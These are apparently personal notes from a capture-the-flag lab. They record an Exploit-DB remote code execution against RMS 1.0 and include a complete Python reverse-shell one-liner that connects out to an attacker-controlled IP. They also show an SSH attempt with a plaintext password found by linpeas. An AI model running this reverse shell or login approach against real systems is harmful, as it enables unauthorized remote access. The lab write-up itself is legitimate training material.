Found RCE for RMS 1.0 on [exploitDB](https://www.exploit-db.com/exploits/47520)

Modified the file and fixed syntax errors. Once fixed,
![[Pasted image 20240821184625.png]]

![[Pasted image 20240821184646.png]]
![[Pasted image 20240821184654.png]]

Got a reverse shell using python as user `apache`
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.103.8",4201));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![[Pasted image 20240821190221.png]]

![[Pasted image 20240821190256.png]]
Using the password gathered by running linpeas.sh, tried SSHing as user `edward`

```bash
ssh zeno@10.10.182.201
```
`edward:FrobjoodAdkoonceanJa`

